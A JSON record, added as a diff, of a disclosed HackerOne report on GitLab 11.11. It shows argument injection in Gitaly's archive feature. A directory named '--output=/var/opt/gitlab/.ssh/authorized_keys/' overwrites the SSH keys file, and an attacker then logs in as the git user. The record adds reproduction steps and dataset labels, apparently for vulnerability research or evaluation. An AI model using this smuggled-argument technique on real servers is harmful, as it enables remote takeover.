@@ -1,0 +1,45 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "saltyyolk ",
+  "title": "Local files could be overwritten in GitLab, leading to remote command execution",
+  "content": "\nSummary\nArbitrary file overwrite\nA new feature (download a directory of a repository) in GitLab 11.11 introduced some changes in ./internal/service/repository/archive.go of Gitaly.\nCode 409 Bytes\n1func handleArchive(ctx context.Context, writer io.Writer, in *gitalypb.GetArchiveRequest, compressCmd *exec.Cmd, format string, path string) error {                                                           \n2        archiveCommand, err := git.Command(ctx, in.GetRepository(), \"archive\",                          \n3                \"--format=\"+format, \"--prefix=\"+in.GetPrefix()+\"/\", in.GetCommitId(), path) \n4...\nA new parameter path is concatenated to the command, the parameter is supposed to carry the path of the directory to be downloaded in the repository. However, Gitaly could be misled by an attacker if the path starts with double dashes, for example:\nCode 181 Bytes\n1$ tree\n2.\n3\u2514\u2500\u2500 --output=\n4    \u2514\u2500\u2500 var\n5        \u2514\u2500\u2500 opt\n6            \u2514\u2500\u2500 gitlab\n7                \u2514\u2500\u2500 .ssh\n8                    \u2514\u2500\u2500 authorized_keys\n9                        \u2514\u2500\u2500 id_ed25519.pub\nSuppose we have a repository which has only one file id_ed25519.pub (contains my pubkey) in directory --output=/var/opt/gitlab/.ssh/authorized_keys/. What happens in Gitaly when I click download directory as tar under this directory? The actual command get executed here is:\nCode 113 Bytes\n1git --git-dir=DIR_TO_REPO archive --format tar --prefix=/ COMMIT_ID --output=/var/opt/gitlab/.ssh/authorized_keys\nThe content of the archive gets written to the /var/opt/gitlab/.ssh/authorized_keys file instead of transferred to the user.\nRCE\nThe reason I choose tar as the format is that tar doesn't compress the content, all contents in the repository are preserved with some tar headers concatenated into the output.\nIn the above example:\nContent of id_ed25519.pub\nCode 22 Bytes\n1#\n2ssh-ed25519 \u2588\u2588\u2588\u2588\u2588\u2588\n3#\nContent of the overwritten authorized_keys\nCode 1.58 KiB\n1~/workspace/gitlab/archive$ docker exec -ti e1a bash\n2root@localhost:/# cat /var/opt/gitlab/.ssh/authorized_keys \n3pax_global_header00006660000000000000000000000064134712530140014512gustar00rootroot0000000000000052 comment=412e285af38342030e5e30fcba77cb4296fb245d\n4archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/000077500000000000000000000000001347125301400244635ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/000077500000000000000000000000001347125301400262525ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/000077500000000000000000000000001347125301400270425ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/000077500000000000000000000000001347125301400276445ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/000077500000000000000000000000001347125301400311065ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/000077500000000000000000000000001347125301400317615ustar00rootroot00000000000000authorized_keys/000077500000000000000000000000001347125301400351135ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.sshid_ed25519.pub000066400000000000000000000001661347125301400373000ustar00rootroot00000000000000archive-master---output=-var-opt-gitlab-.ssh-authorized_keys/--output=/var/opt/gitlab/.ssh/authorized_keys#\n5ssh-ed25519 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n6#\nSSH server allows dummy content in the authorized_keys file, as long as the public keys are started with a new line.\nSo, after the exploit:\nCode 590 Bytes\n1$ ssh -i ~/.ssh/id_ed25519 git@10.26.0.3\n2\n3The programs included with the Ubuntu system are free software;\n4the exact distribution terms for each program are described in the\n5individual files in /usr/share/doc/*/copyright.\n6\n7Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\n8applicable law.\n9\n10\n11The programs included with the Ubuntu system are free software;\n12the exact distribution terms for each program are described in the\n13individual files in /usr/share/doc/*/copyright.\n14\n15Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\n16applicable law.\n17\n18$ whoami\n19git\n20$ \nSteps to reproduce\nAs stated above.\nImpact\nFor most self-hosted single instance GitLab users, this is a RCE issue.\nFor those who has Gitaly running in different OS with gitlab-shell, the impact varies and depends on different circumstances.\nFor GitLab.com, as the described PoC is destructive and it's hard to observe if I choose some other files to overwrite. I didn't test and I want to leave the evaluation of impact to you guys. :p\nResults of GitLab environment info\nCode 831 Bytes\n1root@localhost:/# gitlab-rake gitlab:env:info\n2\n3System information\n4System:\t\t\n5Current User:\tgit\n6Using RVM:\tno\n7Ruby Version:\t2.5.3p105\n8Gem Version:\t2.7.9\n9Bundler Version:1.17.3\n10Rake Version:\t12.3.2\n11Redis Version:\t3.2.12\n12Git Version:\t2.21.0\n13Sidekiq Version:5.2.7\n14Go Version:\tunknown\n15\n16GitLab information\n17Version:\t11.11.0\n18Revision:\t3e8ca2fb781\n19Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n20DB Adapter:\tPostgreSQL\n21DB Version:\t9.6.11\n22URL:\t\thttp://10.26.0.3\n23HTTP Clone URL:\thttp://10.26.0.3/some-group/some-project.git\n24SSH Clone URL:\tgit@10.26.0.3:some-group/some-project.git\n25Using LDAP:\tno\n26Using Omniauth:\tyes\n27Omniauth Providers: \n28\n29GitLab Shell\n30Version:\t9.1.0\n31Repository storage paths:\n32- default: \t/var/opt/gitlab/git-data/repositories\n33GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n34Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nOS command injections usually lead to serious results, remote code execution in this case.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 12000,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1563337380,
+  "report_url": "https://hackerone.com/reports/587854",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Create a repository with a directory structure that starts with double dashes (e.g., '--output=/var/opt/gitlab/.ssh/authorized_keys/') and contains a file (e.g., 'id_ed25519.pub') with malicious content."
+    ],
+    [
+      2,
+      "Use the GitLab feature to download the directory as a tar archive, which triggers the arbitrary file overwrite vulnerability."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to overwrite arbitrary files on the GitLab server by exploiting a feature that downloads a directory as a tar archive. By crafting a directory name that starts with double dashes, the attacker can inject command-line arguments into the git archive command, leading to file overwrites and potential remote code execution.",
+  "reason": "The attack involves understanding the git archive command's behavior with malicious directory names and crafting a specific directory structure to exploit it. While the concept of argument injection is known, the specific interaction with GitLab's directory download feature is non-obvious and requires precise knowledge of the internal implementation.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an arbitrary file overwrite due to improper handling of the 'path' parameter in GitLab's Gitaly service. This is not directly related to authentication or authorization bypass but rather a command injection leading to remote code execution. The methodology described focuses on AuthN/AuthZ bypass and IDOR vulnerabilities by swapping user sessions and resource IDs, which does not apply to this specific vulnerability.",
+    "is_detectable": false
+  }
+}
